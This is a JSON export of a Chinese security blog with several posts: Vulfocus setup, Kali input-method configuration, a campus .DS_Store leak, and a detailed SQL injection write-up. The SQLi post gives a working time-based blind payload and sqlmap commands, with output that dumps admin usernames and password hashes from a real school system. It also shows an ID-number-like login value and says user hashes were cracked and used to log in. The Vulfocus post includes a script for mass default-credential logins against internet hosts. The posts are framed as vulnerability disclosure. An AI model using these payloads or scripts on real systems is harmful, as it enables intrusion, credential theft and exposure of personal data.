{"meta":{"title":"_0xf4n9x_'s Blog","subtitle":null,"description":"Focus on #Cybersecurity #PenTest #RedTeam","author":"_0xf4n9x_","url":"https://fanqxu.github.io","root":"/"},"pages":[{"title":"Who Am I？","date":"2019-08-24T20:48:33.000Z","updated":"2021-05-31T09:06:04.386Z","comments":true,"path":"about/index.html","permalink":"https://fanqxu.github.io/about/index.html","excerpt":"","text":"关于此站 已整改，从今此站就作为我技术学习的一个记录地。 一名安全技术爱好者： 渗透测试 写写代码 安全研究 不局限于技术喜欢看不同领域的书。 执着于心，谦和之中见卓越 当然，我喜欢与谦虚的人交流。 一点随想或许这是一个充满挑战的好时代！"},{"title":"categories","date":"2020-01-15T00:07:27.000Z","updated":"2020-01-19T03:38:14.000Z","comments":false,"path":"categories/index.html","permalink":"https://fanqxu.github.io/categories/index.html","excerpt":"","text":""},{"title":"Comments","date":"2018-12-20T15:13:48.000Z","updated":"2020-01-19T03:38:28.000Z","comments":true,"path":"comment/index.html","permalink":"https://fanqxu.github.io/comment/index.html","excerpt":"","text":"念两句诗 穷则独善其身，达则兼济天下。 【战国】孟子《尽心章句上》"},{"title":"Labs","date":"2019-01-05T13:47:59.000Z","updated":"2020-04-11T15:22:28.000Z","comments":true,"path":"lab/index.html","permalink":"https://fanqxu.github.io/lab/index.html","excerpt":"","text":"一些靶机排名不分先后。。。 综合性靶场 | 在线 CTF 实验吧 合天网安 网络信息安全攻防学习平台 i春秋 墨者学院 XCTF 必火网络安全 DVWA WebGoat We Chall CG CTF SQL Injection SQLi-LABS RedTiger’s Hackit XSS alf.nu prompt XSS Challenges 离线自建 vulnhub 漏洞复现 | docker Vulhub Vulapps"},{"title":"Other Blogs","date":"2018-12-19T15:11:06.000Z","updated":"2020-03-14T14:23:52.000Z","comments":true,"path":"links/index.html","permalink":"https://fanqxu.github.io/links/index.html","excerpt":"","text":""},{"title":"rss","date":"2018-12-20T15:09:03.000Z","updated":"2020-01-14T21:35:15.000Z","comments":true,"path":"rss/index.html","permalink":"https://fanqxu.github.io/rss/index.html","excerpt":"","text":""},{"title":"tags","date":"2018-12-12T14:14:16.000Z","updated":"2020-01-17T08:54:19.000Z","comments":true,"path":"tags/index.html","permalink":"https://fanqxu.github.io/tags/index.html","excerpt":"","text":""},{"title":"theme-sakura","date":"2019-01-04T14:53:25.000Z","updated":"2020-01-14T21:35:15.000Z","comments":true,"path":"theme-sakura/index.html","permalink":"https://fanqxu.github.io/theme-sakura/index.html","excerpt":"","text":"About Theme Hexo theme Sakura modified from the WordPress theme Sakura，thanks to the original author Mashiro Thanks:https://github.com/mashirozx/Sakura/ https://github.com/honjun/hexo-theme-sakura This Blog is built on Github Pages and Hexo."}],"posts":[{"title":"搭建Vulfocus快速进行漏洞复现及靶场搭建","slug":"Vulfocus-build","date":"2021-01-26T02:45:08.000Z","updated":"2021-01-26T03:23:16.000Z","comments":true,"path":"2021/01/26/Vulfocus-build/","link":"","permalink":"https://fanqxu.github.io/2021/01/26/Vulfocus-build/","excerpt":"","text":"使用docker可以快速、方便地搭建各种靶场和漏洞环境。 而Vulfocus是一个漏洞集成平台，可将漏洞环境docker镜像，放入即可使用，开箱即用。 Github：https://github.com/fofapro/vulfocus 文档：https://fofapro.github.io/vulfocus/ 安装dockerapt install docker docker-compose 拉取Vulfocus镜像docker pull vulfocus/vulfocus:latest 运行Vulfocus容器docker run -d -p 8089:80 -v /var/run/docker.sock:/var/run/docker.sock -e VUL_IP=192.168.0.102 vulfocus/vulfocus -e VUL_IP=192.168.0.102 为本机 IP 默认账户密码为 admin/admin 浏览器访问 http://192.168.0.102:8089 进行登录，进去第一件事情修改密码 靶场docker镜像 从本地docker镜像中导入本地已经准备了如下几个靶场容器环境： docker pull area39/pikachu docker pull citizenstig/dvwa docker pull acgpiano/sqli-labs 首页直接启动靶场容器 小TrickFofa Dork：app=&quot;白帽汇-vulfocus&quot; Vulfocus默认用户名密码是admin/admin，可根据这个默认密码编写脚本批量登录，用以测试公网上有多少使用默认密码的Vulfocus。 登录的HTTP数据包： POST /api/user/login HTTP/1.1 Host: x.x.x.x:8002 Connection: keep-alive Content-Length: 39 Pragma: no-cache Cache-Control: no-cache Accept: application/json, text/plain, */* DNT: 1 User-Agent: Mozilla/5.0 (X11; SunOS sun4u; rv:84.0) Gecko/20100101 Firefox/84.0 Content-Type: application/json;charset=UTF-8 Origin: http://x.x.x.x:8002 Referer: http://x.x.x.x:8002/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7 Cookie: sidebarStatus=0 &#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;admin&quot;&#125; Python代码demo： def login(URL): urls = [] headers = &#123; &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.87 Safari/537.36&quot; &#125; data = &#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;admin&quot;&#125; if os.path.isfile(URL): with open(URL) as target: urls = target.read().splitlines() else: urls = URL.split() for url in urls: loginURL = &quot;http://&quot; + url + &quot;/api/user/login&quot; try: resp = requests.post(loginURL, data=data, timeout=5, headers=headers) resData = json.loads(resp.text) if resData[&#39;token&#39;] != None: print(url + &quot; Login Success&quot;) with open(&quot;success.txt&quot;, &quot;a+&quot;) as f: f.write(url + &quot;\\n&quot;) else: pass except: print(url + &quot; Login Failed&quot;)","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://fanqxu.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://fanqxu.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}]},{"title":"Xfce桌面下Kali Linux的中文输入法配置","slug":"linuxRimeInput","date":"2021-01-03T11:25:09.000Z","updated":"2021-01-03T14:01:36.000Z","comments":true,"path":"2021/01/03/linuxRimeInput/","link":"","permalink":"https://fanqxu.github.io/2021/01/03/linuxRimeInput/","excerpt":"","text":"Linux上的输入法有商业公司的搜狗输入法，也有开源的输入法框架iBus和Fcitx；搜狗输入法基本安装/开箱即用，很是方便，但是商业公司有收集隐私的癖好，并且由于输入法软件掌握着我们的输入入口，这让注重隐私的我不得不重视。 而且对于刚刚使用Linux的、并希望将其作为主系统的新手来说，配置一款顺手的中文输入法是那么的至关重要，但是却不是那么容易。 0x00 fcitx5框架安装Fcitx5是继Fcitx后的新一代输入法框架。 卸载原自带的fcitx以及fcitx-rime： $ sudo apt remove fcitx fcitx-rime:amd64 注销用户或者重启系统之后再安装fcitx5： $ sudo apt install fcitx5 0x01 环境变量配置创建一个名为.pam_environment 的环境变量文件，输入如下内容： $ cat ~/.pam_environment GTK_IM_MODULE DEFAULT=fcitx QT_IM_MODULE DEFAULT=fcitx XMODIFIERS DEFAULT=\\@im=fcitx SDL_IM_MODULE DEFAULT=fcitx 0x02 中文输入法引擎安装fcitx5-rime： $ sudo apt install fcitx5-rime 在Fcitx Configuration中的Input Method中添加rime中文输入法： 切换输入法的默认快捷键是Control+Space，注意不要与其他快捷键冲突。可以通过如下界面修改： 0x03 皮肤主题fcitx5输入法的皮肤可以在Github上搜索到一些别人制作好了的，我使用的是：https://github.com/sxqsfun/fcitx5-sogou-themes Alpha-white-2.0 Alpha-black Alpha-white-2.0 Alpha-white 首先先clone到本地： $ git clone https://github.com/sxqsfun/fcitx5-sogou-themes.git 然后再将各个皮肤主题移动到fcitx5的theme目录： $ cd fcitx5-sogou-themes &amp;&amp; cp * /usr/share/fcitx5/themes/ 然后再桌面右上角点击Fcitx图标中的Configure进入如下图所示的Fcitx Configuration中，先点击Addons然后找到Classic User Interface，进入到Configure，就可以切换Theme了~ 0x04 自定义词库配置Linux下rime的配置目录位于：~/.local/share/fcitx5/rime 在此直接配置，讲解各个文件的作用对于新手意义不大。 扩充词库先clone他人收集的词库到本地： $ git clone https://github.com/rime-aca/dictionaries $ cd dictionaries/luna_pinyin.dict &amp;&amp; ls double_pinyin.custom.yaml luna_pinyin.cn_en.dict.yaml luna_pinyin.custom.yaml luna_pinyin.extended.dict.yaml luna_pinyin.hanyu.dict.yaml luna_pinyin.poetry.dict.yaml 将后5个文件移动到rime配置目录： $ cp luna_pinyin* ~/.local/share/fcitx5/rime/ 切换简体中文输入将luna_pinyin.custom.yaml修改成luna_pinyin_simp.custom.yaml，不然就是繁体字。 $ cd ~/.local/share/fcitx5/rime/ &amp;&amp; mv luna_pinyin.custom.yaml luna_pinyin_simp.custom.yaml 全局配置文件创建一个名为default.custom.yaml的文件，并编辑。 $ vim default.custom.yaml 添加如下基础配置： patch: # 简体中文 schema_list: - schema: luna_pinyin_simp # 5个候选词 &quot;menu/page_size&quot;: 7 # 以方括号 [ ] 来换页 key_binder/bindings: - when: paging accept: bracketleft send: Page_Up - when: has_menu accept: bracketright send: Page_Down 模糊音设置编辑luna_pinyin_simp.custom.yaml文件，添加如下内容至行尾： # 模糊音 &quot;speller/algebra&quot;: - derive/^([zcs])h/$1/ #zh,ch,sh-&gt;z,c,s - derive/^([zcs])([^h])/$1h$2/ #z,c,s-&gt;zh,ch,sh - derive/ou$/uo/ # 模糊拼音 ou =&gt; uo - derive/uo$/ou/ # 模糊拼音 uo =&gt; ou - derive/([ei])n$/$1ng/ # en -&gt; eng, in -&gt; ing - derive/([ei])ng$/$1n/ # eng-&gt;en, ing -&gt; in - abbrev/^([a-z]).+$/$1/ #简拼支持 - abbrev/^([zcs]h).+$/$1/ #模糊音的简拼支持 delimiter: &quot; &#39;&quot; #分隔符 彩色Emoji首先需要先在系统上安装TwitterColorEmoji字体。 去https://github.com/eosrei/twemoji-color-font/releases下载最新release： $ wget https://github.com/eosrei/twemoji-color-font/releases/download/v13.0.1/TwitterColorEmoji-SVGinOT-Linux-13.0.1.tar.gz 解压并执行安装脚本： $ tar zxf TwitterColorEmoji-SVGinOT-Linux-13.0.1.tar.gz &amp;&amp; cd TwitterColorEmoji-SVGinOT-Linux-13.0.1 &amp;&amp; ./install.sh 再然后clonerime-emoji到本地： $ git clone https://github.com/rime/rime-emoji 将opencc目录移动到rime配置文件目录： $ cd rime-emoji &amp;&amp; cp -r opencc ~/.local/share/fcitx5/rime 将emoji_suggestion.yaml文件中的内容复制到luna_pinyin_simp.custom.yaml中。 $ cat emoji_suggestion.yaml # encoding: utf-8 patch: switches/@next: name: emoji_suggestion reset: 1 states: [ &quot;🈚️️\\uFE0E&quot;, &quot;🈶️️\\uFE0F&quot; ] &#39;engine/filters/@before 0&#39;: simplifier@emoji_suggestion emoji_suggestion: opencc_config: emoji.json option_name: emoji_suggestion tips: all 重启Fcitx5，即可。 0x05 汇总rime目录下所有配置文件及文件夹： $ cd ~/.local/share/fcitx5/rime &amp;&amp; ls build luna_pinyin.poetry.dict.yaml default.custom.yaml luna_pinyin_simp.custom.yaml installation.yaml luna_pinyin.userdb luna_pinyin.cn_en.dict.yaml opencc luna_pinyin.extended.dict.yaml user.yaml luna_pinyin.hanyu.dict.yaml default.custom其中default.custom.yaml文件所有内容如下： $ cat default.custom.yaml patch: # 简体中文 schema_list: - schema: luna_pinyin_simp # 7个候选词 &quot;menu/page_size&quot;: 7 # 以方括号 [ ] 来换页 key_binder/bindings: - when: paging accept: bracketleft send: Page_Up - when: has_menu accept: bracketright send: Page_Down luna_pinyin_simp.customluna_pinyin_simp.custom.yaml文件所有内容如下： $ cat luna_pinyin_simp.custom.yaml patch: # 載入朙月拼音擴充詞庫 &quot;translator/dictionary&quot;: luna_pinyin.extended # 改寫拼寫運算，使得含西文的詞彙（位於 luna_pinyin.cn_en.dict.yaml 中）不影響簡拼功能（注意，此功能只適用於朙月拼音系列方案，不適用於各類雙拼方案） # 本條補靪只在「小狼毫 0.9.30」、「鼠鬚管 0.9.25 」、「Rime-1.2」及更高的版本中起作用。 &quot;speller/algebra/@before 0&quot;: xform/^([b-df-hj-np-tv-z])$/$1_/ # 模糊音 &quot;speller/algebra&quot;: - derive/^([zcs])h/$1/ #zh,ch,sh-&gt;z,c,s - derive/^([zcs])([^h])/$1h$2/ #z,c,s-&gt;zh,ch,sh - derive/ou$/uo/ # 模糊拼音 ou =&gt; uo - derive/uo$/ou/ # 模糊拼音 uo =&gt; ou - derive/([ei])n$/$1ng/ # en -&gt; eng, in -&gt; ing - derive/([ei])ng$/$1n/ # eng-&gt;en, ing -&gt; in - abbrev/^([a-z]).+$/$1/ #简拼支持 - abbrev/^([zcs]h).+$/$1/ #模糊音的简拼支持 delimiter: &quot; &#39;&quot; #分隔符 # rime-emoji switches/@next: name: emoji_suggestion reset: 1 states: [ &quot;🈚️️\\uFE0E&quot;, &quot;🈶️️\\uFE0F&quot; ] &#39;engine/filters/@before 0&#39;: simplifier@emoji_suggestion emoji_suggestion: opencc_config: emoji.json option_name: emoji_suggestion tips: all 0x06 ReferenceFcitx5 - ArchWiki: https://wiki.archlinux.org/index.php/Fcitx5","categories":[{"name":"linux","slug":"linux","permalink":"https://fanqxu.github.io/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://fanqxu.github.io/tags/linux/"}]},{"title":"校园内某站存在Ds_Store信息泄露漏洞","slug":"campusDsStoreInfoLeak","date":"2020-11-29T02:33:40.000Z","updated":"2020-11-29T14:52:20.000Z","comments":true,"path":"2020/11/29/campusDsStoreInfoLeak/","link":"","permalink":"https://fanqxu.github.io/2020/11/29/campusDsStoreInfoLeak/","excerpt":"","text":"0x00 DS_Store文件简介.DS_Store (全称Desktop Services Store) 是一种由苹果公司的macOS系统所创造的一个隐藏文件，目的在于存贮目录的自定义属性，例如文件们的图标位置或者是背景色的选择。 查看.DS_Store内容可以发现一些文件名以及Finder的属性。 如果开发人员将.DS_Store文件与开发项目一同上传到线上环境，则可能造成文件目录结构、源代码、备份文件泄漏。 在针对校园网进行渗透测试的过程中就发现如下站点存在此漏洞。 0x01 漏洞探测利用工具ds_store_expds_store_exp是一个.DS_Store文件泄漏利用脚本，它解析.DS_Store文件并递归地下载文件到本地。 https://github.com/lijiejie/ds_store_exp 0x02 对源码进行审计对下载下来的源码进行审计，发现下载下来的都是一些HTML静态文件，并且这还是一个功能不完善的系统。例如说login.jsp这个页面，登录不登录都完全不影响使用。 还有请求如下图的input_info.jsp文件，直接报500了。 这个文件也没下载下来。 根据本人对学校的了解，可以猜测出大致情况就是，这个系统原本是部署在公网的，也就是公网可以访问到这个网站/系统。但是呢，由于input_info.jsp这个页面存在某些漏洞被公网的其他人攻击，所以校方网站维护人员将此系统设置了一道防火墙，不允许公网访问，只允许校园内网访问此系统；并且这个写的有漏洞的页面估计七改八改改出问题了，导致访问出现500。根据input_info.jsp这个文件名，猜测这里可能存在文件上传漏洞！ 0x03 解决方案网站运维人员应立即删除.DS_Store文件。 另外为避免下次出现此漏洞，开发人员应该在macOS系统环境下打开终端，输入以下命令来禁用.DS_store生成。重启生效。 $ defaults write com.apple.desktopservices DSDontWriteNetworkStores -bool TRUE 如果要启用.DS_store生成，使用下边命令： $ defaults delete com.apple.desktopservices DSDontWriteNetworkStores","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://fanqxu.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"信息泄露漏洞","slug":"信息泄露漏洞","permalink":"https://fanqxu.github.io/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"name":"渗透测试","slug":"渗透测试","permalink":"https://fanqxu.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"校园内某报名系统出现SQL盲注漏洞","slug":"campusSqli","date":"2020-09-19T13:06:32.000Z","updated":"2020-11-22T08:44:31.000Z","comments":true,"path":"2020/09/19/campusSqli/","link":"","permalink":"https://fanqxu.github.io/2020/09/19/campusSqli/","excerpt":"","text":"0x00 jwzsb报名系统最开始是对jwzsb.xxx.edu.cn这个网站进行了分析，后来发现另一个网站 zpbm.xxx.edu.cn与jwzsb用的是同一套Web管理系统。对zpbm的登录数据包进行了分析，发现了一个注入点，是基于时间的SQL盲注漏洞。可以凭借此漏洞获取数据库的全部数据。在发现该漏洞后，发现操作数据库的权限较低，只能查询，而不能进行其他操作。所以无法直接利用SQL注入操作DBMS来进一步渗透至（Linux）操作系统。 登录POST数据包： POST /admin/alogin_chk.php HTTP/1.1 Content-Type: application/x-www-form-urlencoded X-Requested-With: XMLHttpRequest Referer: http://jwzsb.xxx.edu.cn/ Cookie: PHPSESSID=2fa4b256b9f62528cf8b5892c8754869 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate Content-Length: 107 Host: jwzsb.xxx.edu.cn User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko Connection: Keep-alive apassword=g00dPa%24%24w0rD&amp;auserid=0&#39;XOR(if(now()=sysdate()%2Cslee 由于发现此报名系统的漏洞，便立马报告给校方了，学校立马关闭了这个网站，这导致了后面写这篇文章的时候无法复现漏洞。 不过下面的zpbm这个站还有记录。 0x01 zpbm注入分析 登录POST数据包： POST /login_chk.php HTTP/1.1 Host: zpbm.xxx.edu.cn Content-Length: 69 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4080.0 Safari/537.36 Edg/82.0.453.0 Origin: http://zpbm.xxx.edu.cn Content-Type: application/x-www-form-urlencoded Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://zpbm.xxx.edu.cn/login.php Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7 Cookie: PHPSESSID=83ee0d6b80269f465a0daa50bd3ad8c2 Connection: close juserid=420104199804103057&amp;jpassword=103057&amp;submit=%E7%99%BB%E5%BD%95 发送原始数据包，响应包立马返回到了客户端 发送带有Payload的数据包，服务端会等个5秒后再给客户端返回响应包。可以看到这个时间： Payload： juserid=420104199804103057&#39;) AND (SELECT 4494 FROM (SELECT(SLEEP(5)))cRrg) AND (&#39;hWhK&#39;=&#39;hWhK&amp;jpassword=103057&amp;submit=%E7%99%BB%E5%BD%95 可以看出问题出现在参数juserid上，使用&#39;)闭合前面的(&#39;。后面的AND (SELECT 4494 FROM (SELECT(SLEEP(5)))cRrg)其中的SLEEP(5)便是基于时间的SQL盲注漏洞测试中常用的一个函数。再之后的参数是安全的 (&#39;juserid=420104199804103057&#39;) AND (SELECT 4494 FROM (SELECT(SLEEP(5)))cRrg) AND (&#39;hWhK&#39;=&#39;hWhK&#39;) &amp;jpassword=103057&amp;submit=%E7%99%BB%E5%BD%95 0x02 数据库枚举枚举当前用户$ sqlmap -r sub.txt --random-agent --time-sec=5 -p juserid --current-user [*] starting @ 01:17:14 /2020-09-19/ --- Parameter: juserid (POST) Type: time-based blind Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP) Payload: juserid=420104199804103057&#39;) AND (SELECT 4494 FROM (SELECT(SLEEP(5)))cRrg) AND (&#39;hWhK&#39;=&#39;hWhK&amp;jpassword=103057&amp;submit=%E7%99%BB%E5%BD%95 Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR]) --- [01:17:14] [INFO] the back-end DBMS is MySQL back-end DBMS: MySQL &gt;= 5.0.12 [01:17:14] [INFO] fetching current user [01:17:14] [INFO] resuming partial value: \\\\x04A [01:17:14] [PAYLOAD] 420104199804103057&#39;) AND (SELECT 1134 FROM (SELECT(SLEEP(5-(IF(ORD(MID((IFNULL(CAST(CURRENT_USER() AS NCHAR),0x20)),3,1))&gt;64,0,5)))))zBMz) AND (&#39;txfM&#39;=&#39;txfM [01:17:14] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done) [01:26:27] [INFO] retrieved: Auser@localhost [01:26:27] [DEBUG] performed 125 queries in 553.43 seconds current user: &#39;\\\\x04Auser@localhost&#39; [*] ending @ 01:26:27 /2020-09-19/ 枚举DBMS用户$ sqlmap -r sub.txt --random-agent --time-sec=5 -p juserid --users [*] starting @ 19:30:08 /2020-09-19/ --- Parameter: juserid (POST) Type: time-based blind Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP) Payload: juserid=420104199804103057&#39;) AND (SELECT 4494 FROM (SELECT(SLEEP(5)))cRrg) AND (&#39;hWhK&#39;=&#39;hWhK&amp;jpassword=103057&amp;submit=%E7%99%BB%E5%BD%95 --- [19:30:08] [INFO] the back-end DBMS is MySQL back-end DBMS: MySQL &gt;= 5.0.12 [19:30:08] [INFO] fetching database users [19:30:08] [INFO] fetching number of database users [19:30:08] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done) [19:30:08] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 1 [19:30:19] [INFO] retrieved: &#39;rsuser&#39;@&#39;localhost&#39; database management system users [1]: [*] &#39;rsuser&#39;@&#39;localhost&#39; [*] ending @ 19:42:32 /2020-09-19/ 枚举当前数据库以及探测DBA$ sqlmap -r sub.txt --random-agent --time-sec=5 -p juserid -v3 --current-db --is-dba [*] starting @ 01:30:36 /2020-09-19/ --- Parameter: juserid (POST) Type: time-based blind Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP) Payload: juserid=420104199804103057&#39;) AND (SELECT 4494 FROM (SELECT(SLEEP(5)))cRrg) AND (&#39;hWhK&#39;=&#39;hWhK&amp;jpassword=103057&amp;submit=%E7%99%BB%E5%BD%95 Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR]) --- [01:30:36] [INFO] the back-end DBMS is MySQL back-end DBMS: MySQL &gt;= 5.0.12 [01:30:36] [INFO] fetching current database [01:30:36] [PAYLOAD] 420104199804103057&#39;) AND (SELECT 2939 FROM (SELECT(SLEEP(5-(IF(ORD(MID((IFNULL(CAST(DATABASE() AS NCHAR),0x20)),1,1))&gt;64,0,5)))))pbwD) AND (&#39;ugmQ&#39;=&#39;ugmQ [01:30:36] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done) [01:33:07] [INFO] retrieved: zpbm [01:33:07] [DEBUG] performed 32 queries in 151.27 seconds current database: &#39;zpbm&#39; [01:33:07] [INFO] testing if current user is DBA [01:33:07] [INFO] fetching current user [01:33:07] [INFO] resumed: \\\\x04Auser@localhost [01:33:07] [DEBUG] performed 0 queries in 0.00 seconds [01:33:07] [PAYLOAD] 420104199804103057&#39;) AND (SELECT 3791 FROM (SELECT(SLEEP(5-(IF((SELECT (CASE WHEN ((SELECT super_priv FROM mysql.user WHERE user=0x044175736572 LIMIT 0,1)=0x59) THEN 1 ELSE 0 END))=1,0,5)))))DVpF) AND (&#39;eZLv&#39;=&#39;eZLv current user is DBA: False [*] ending @ 01:33:07 /2020-09-19/ 枚举zpbm数据库中的表$ sqlmap -r sub.txt --random-agent --time-sec=5 -p juserid -v3 -D zpbm --tables [*] starting @ 01:39:26 /2020-09-19/ --- Parameter: juserid (POST) Type: time-based blind Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP) Payload: juserid=420104199804103057&#39;) AND (SELECT 4494 FROM (SELECT(SLEEP(5)))cRrg) AND (&#39;hWhK&#39;=&#39;hWhK&amp;jpassword=103057&amp;submit=%E7%99%BB%E5%BD%95 Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR]) --- [01:39:26] [INFO] the back-end DBMS is MySQL back-end DBMS: MySQL &gt;= 5.0.12 [02:23:15] [INFO] retrieved: zzmm_tb [02:23:15] [DEBUG] performed 50 queries in 241.85 seconds Database: zpbm [10 tables] +------------+ | admuser | | basedata | | examadd | | hunying_tb | | juser | | nation_tb | | xlxw_tb | | ypgw_tb | | zpry | | zzmm_tb | +------------+ [*] ending @ 02:23:15 /2020-09-19/ 枚举admuser表中的所有字段$ sqlmap -r sub.txt --random-agent --time-sec=5 -p juserid -v2 -D zpbm -T admuser --columns [*] starting @ 19:35:48 /2020-09-19/ --- Parameter: juserid (POST) Type: time-based blind Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP) Payload: juserid=420104199804103057&#39;) AND (SELECT 4494 FROM (SELECT(SLEEP(5)))cRrg) AND (&#39;hWhK&#39;=&#39;hWhK&amp;jpassword=103057&amp;submit=%E7%99%BB%E5%BD%95 Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR]) --- [19:35:50] [INFO] the back-end DBMS is MySQL back-end DBMS: MySQL &gt;= 5.0.12 Database: zpbm Table: admuser [11 columns] +-------------+------------+ | Column | Type | +-------------+------------+ | aclass | tinyint(4) | | aLlogIP | char(40) | | aLlogtime | datetime | | aLogcount | int(11) | | aname | char(20) | | apassword | char(40) | | aRegIP | char(40) | | aRegtime | datetime | | auserid | char(10) | | mobilephone | char(20) | | officephone | char(20) | +-------------+------------+ [*] ending @ 19:35:50 /2020-09-19/ dump zpbm数据库中的admuser表中的auserid字段$ sqlmap -r sub.txt --random-agent --time-sec=5 -p juserid -v2 -D zpbm -T admuser -C auserid --dump [*] starting @ 21:34:45 /2020-09-19/ --- Parameter: juserid (POST) Type: time-based blind Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP) Payload: juserid=420104199804103057&#39;) AND (SELECT 4494 FROM (SELECT(SLEEP(5)))cRrg) AND (&#39;hWhK&#39;=&#39;hWhK&amp;jpassword=103057&amp;submit=%E7%99%BB%E5%BD%95 Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR]) --- [21:34:45] [INFO] the back-end DBMS is MySQL back-end DBMS: MySQL &gt;= 5.0.12 [21:34:45] [INFO] fetching entries of column(s) &#39;auserid&#39; for table &#39;admuser&#39; in database &#39;zpbm&#39; [21:34:45] [INFO] fetching number of column(s) &#39;auserid&#39; entries for table &#39;admuser&#39; in database &#39;zpbm&#39; [21:34:45] [INFO] resumed: 5 [21:34:45] [DEBUG] performed 0 queries in 0.00 seconds [21:41:40] [DEBUG] analyzing table dump for possible password hashes Database: zpbm Table: admuser [5 entries] +---------+ | auserid | +---------+ | adm | | cs1 | | cs2 | | fs | | nhc | +---------+ [*] ending @ 21:41:40 /2020-09-19/ dump密码字段$ sqlmap -r sub.txt --random-agent --time-sec=5 -p juserid -v2 -D zpbm -T admuser -C apassword --dump [*] starting @ 19:54:25 /2020-09-19/ sqlmap resumed the following injection point(s) from stored session: --- Parameter: juserid (POST) Type: time-based blind Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP) Payload: juserid=420104199804103057&#39;) AND (SELECT 4494 FROM (SELECT(SLEEP(5)))cRrg) AND (&#39;hWhK&#39;=&#39;hWhK&amp;jpassword=103057&amp;submit=%E7%99%BB%E5%BD%95 Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR]) --- [19:54:26] [INFO] the back-end DBMS is MySQL back-end DBMS: MySQL &gt;= 5.0.12 [19:54:26] [INFO] fetching entries of column(s) &#39;apassword&#39; for table &#39;admuser&#39; in database &#39;zpbm&#39; [19:54:26] [INFO] fetching number of column(s) &#39;apassword&#39; entries for table &#39;admuser&#39; in database &#39;zpbm&#39; [19:54:26] [INFO] resumed: 5 [19:54:26] [DEBUG] performed 0 queries in 0.00 seconds [21:27:56] [INFO] recognized possible password hashes in column &#39;apassword&#39; [21:32:25] [DEBUG] post-processing table dump Database: zpbm Table: admuser [5 entries] +----------------------------------+ | apassword | +----------------------------------+ | 2bcfc22a73d585e36d42d60ccbf04988 | | 4380ee904cccde365ea8166ca95056a7 | | 4a79f79abec0e1939591d5db8a6cd565 | | 97422bab517d948a90db09345d244433 | | af9d6e46767861dfb0a0c3387764599d | +----------------------------------+ [*] ending @ 21:32:25 /2020-09-19/ 原本只对admuser表进行了枚举爆破，因为猜测admuser表应该是管理员用户表，所以拿它开刀。然而发现这张表上的用户并不能登录此系统（后续又在zpmb网站上发现了另一个管理员的登录入口）。所以便继续枚举了另一张juser表中的部分字段，并对MD5加密的hash进行了解密，发现确实可以拿报名用户的用户名密码登录至此系统。 0x03 修复建议使用PHP的过滤字符串函数，对恶意用户输入的特殊字符串进行严格过滤。 过滤SQL注入的函数： addslashes() mysql_escape_string() mysqli_real_escape_string() 没想到的是学校把这两个站直接关闭了。。。","categories":[{"name":"技术","slug":"技术","permalink":"https://fanqxu.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"SQLi","slug":"SQLi","permalink":"https://fanqxu.github.io/tags/SQLi/"}]},{"title":"关于Tor近期的两个0day漏洞在天朝的影响","slug":"tor-0days","date":"2020-08-04T02:12:13.000Z","updated":"2021-03-20T12:48:30.425Z","comments":true,"path":"2020/08/04/tor-0days/","link":"","permalink":"https://fanqxu.github.io/2020/08/04/tor-0days/","excerpt":"","text":"几天前（30 July 2020），安全研究员Neal Krawetz博士表示，Tor Project一直没有解决他在过去几年中报告的一些安全问题，所以他决定公开披露两个关于Tor的0day漏洞详细技术信息。 